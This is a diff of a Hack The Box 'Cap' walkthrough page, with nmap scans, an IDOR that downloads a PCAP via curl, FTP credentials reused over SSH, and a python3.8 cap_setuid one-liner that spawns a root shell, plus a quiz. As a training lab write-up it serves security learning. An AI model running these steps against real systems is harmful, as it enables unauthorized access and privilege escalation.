@@ -1,35 +1,74 @@
 ---
 title: "HTB - Cap Walkthrough"
-date: "2025-12-10"
+date: '2025-12-10'
 tags: ["htb", "walkthrough", "idor", "pcap", "linux-capabilities", "ftp"]
 excerpt: "Walkthrough checklist for the HackTheBox Cap machine — IDOR, PCAP analysis, FTP credentials, and Linux Capability exploitation."
 category: "Walkthrough"
 ---
 
+The checklist below is the whole path, in order. Tick a box once the command in it ran and gave the result you expected.
+
+![The CAP machine on Hack The Box](/images/content/htb-cap/cap.png)
+
 <ProgressChecklist checklistId="htb-cap" />
 
-## Key Commands
+## The commands, in order
 
-### Nmap Discovery
+**Scan.** Find what is listening before you poke anything.
+
 ```bash
 nmap -sT 10.10.10.245 -T4 -vv
-```
-Ports found: 21 (FTP), 22 (SSH), 80 (HTTP).
+# 21/tcp FTP, 22/tcp SSH, 80/tcp HTTP
 
-### Service Detection
-```bash
 nmap -sC -sV -p 21,22,80 10.10.10.245 -T4 -Pn
+# vsftpd 3.0.3, OpenSSH 8.2p1, Gunicorn
 ```
-Identified vsftpd 3.0.3, OpenSSH 8.2p1, Gunicorn.
 
-### Privilege Escalation
+![Nmap TCP connect scan against CAP showing ports 21, 22 and 80 open](/images/content/htb/non-Thumbnails/cap-htb-nmap-sT.png)
+
+![Nmap version detection against CAP naming vsftpd, OpenSSH and Gunicorn](/images/content/htb/non-Thumbnails/cap-htb-nmap-version.png)
+
+**The IDOR.** Hit the security snapshot in the web dashboard, then watch where the browser lands: `/data/<id>`. That id is yours to change.
+
+![Walking the /data/ paths by id to find the one that returns a capture](/images/content/htb/non-Thumbnails/cap-htb-endpoint-bruteforce.png)
+
 ```bash
-# Check Linux capabilities
-getcap -r / 2>/dev/null
-
-# Exploit CAP_SETUID on Python 3.8
-python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-
-# Grab root flag
-cat /root/root.txt
+# walk the low ids, one is not like the others
+curl -s -b "session=<your-cookie>" http://10.10.10.245/data/0 -o cap.pcap
+# /data/0 is the capture, not an empty page
 ```
+
+![The /data/0 endpoint returning the leaked PCAP file](/images/content/htb/non-Thumbnails/cap-htb-data-0.png)
+
+**PCAP to credentials.** Open the capture in Wireshark and follow the FTP stream. FTP sends the login in cleartext, so the password is sitting in the packet.
+
+![The FTP username and password captured in cleartext inside the PCAP](/images/content/htb/non-Thumbnails/cap-htb-ftp-creds.png)
+
+```bash
+# the same pair works over SSH - it is reused
+ssh nathan@10.10.10.245
+```
+
+**Privilege escalation.** Cap has a capability set on a binary, not a kernel bug.
+
+![linPEAS output flagging the capability set on python3.8](/images/content/htb/non-Thumbnails/cap-htb-linpeas-pe1.png)
+
+![More linPEAS output pointing at python3.8 as the way to escalate](/images/content/htb/non-Thumbnails/cap-htb-linpeas-pe2.png)
+
+```bash
+getcap -r / 2>/dev/null
+# /usr/bin/python3.8 cap_setuid+ep
+
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id; cat /root/root.txt
+```
+
+![A root shell on CAP after exploiting the python3.8 capability](/images/content/htb/non-Thumbnails/cap-htb-iamroot.png)
+
+<QuizCard title="What did you forget" questions={[
+  { question: "Which endpoint leaked the capture?", options: ["/data/10", "/data/0", "/snapshot/1", "/pcaps/1"], correct: 1, explanation: "The redirect after a snapshot is /data/<id>. The IDOR is changing the id, and the lowest one held the PCAP." },
+  { question: "Why did the FTP password also open SSH?", options: ["SSH accepts any FTP login", "The password was reused across both services", "vsftpd proxies SSH", "The shell was already root"], correct: 1, explanation: "Nothing clever, just password reuse. nathan used the same password for FTP and SSH." },
+  { question: "What made python3.8 interesting?", options: ["It was setuid root", "It carried the cap_setuid capability", "It was world-writable", "It ran as a systemd service"], correct: 1, explanation: "getcap showed cap_setuid+ep, so the interpreter could call setuid(0) without a setuid bit." }
+]} />
+
+<Cloze title="The escalation one-liner" text="With cap_setuid on python3.8: {{python3.8}} -c 'import os; os.setuid({{0}}); os.system(&quot;/bin/sh&quot;)' then read {{/root/root.txt}}." />
